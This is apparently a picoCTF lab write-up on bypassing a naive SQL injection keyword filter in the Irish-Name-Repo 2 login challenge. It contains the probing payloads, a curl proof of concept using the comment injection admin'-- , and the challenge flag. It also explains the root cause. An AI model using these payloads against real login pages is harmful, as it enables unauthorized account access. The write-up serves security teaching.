# Irish-Name-Repo 2

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{m0R3_SQL_plz_8c334129}`

## Summary

A follow-up to Irish-Name-Repo 1 adds a naive SQLi detector on top of the same vulnerable login
query. The detector only flags the specific combination of a quote *and* the keyword `OR` (or
`UNION`) appearing together in the input — it doesn't block quotes alone, comments alone, or the
underlying injection itself. Swapping the classic `' OR '1'='1' --` tautology for a targeted
`'--` comment injection against a guessed real username (`admin`) bypasses the detector entirely
while exploiting the exact same unescaped string-concatenation bug.

## Discovery

Reusing the Irish-Name-Repo 1 payload immediately reveals the new defense:

```
username=' OR '1'='1' -- 
→ SQLi detected.
```

Bisecting which part of the payload triggers it:

```
username=' OR              → SQLi detected.
username=' AND '1'='1      → Login failed.        (no detection)
username=' union select... → SQLi detected.
username='--                → Login failed.        (no detection, query ran, no matching user)
username='                  → raw SQLite syntax warning (quote alone isn't blocked either)
```

So the filter specifically pattern-matches a quote combined with `or`/`union`, not injection in
general — the query itself is still built by direct string concatenation with no
escaping/parameterization, confirmed by the raw quote producing an actual SQLite parse warning.

## Proof of Concept

No `OR` needed at all: comment out the password check after supplying a real, guessed username
instead of forging a tautology.

```
curl -s -X POST "http://TARGET/login.php" \
  --data-urlencode "username=admin'-- " \
  --data-urlencode "password=x" \
  --data-urlencode "debug=0"
```

```
Logged in! Your flag is: picoCTF{m0R3_SQL_plz_8c334129}
```

`username='admin'--` closes the string right after a valid username and comments out the
`AND password='x'` clause, so the query becomes `WHERE username='admin'` with no password check
at all — while never containing the word `or`/`union` next to a quote, so the detector never
fires.

## Root Cause

The added defense is a keyword/pattern denylist bolted onto an otherwise unfixed SQL injection.
Detecting known *exploit patterns* (`' OR`, `' UNION`) instead of fixing the *root cause*
(string-concatenated queries) leaves every other injection technique — including the simplest
comment-based auth bypass against a correctly-guessed username — fully functional.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-184**: Incomplete List of Disallowed Inputs (signature-based filtering instead of
  parameterized queries)
- **OWASP A03:2021**: Injection
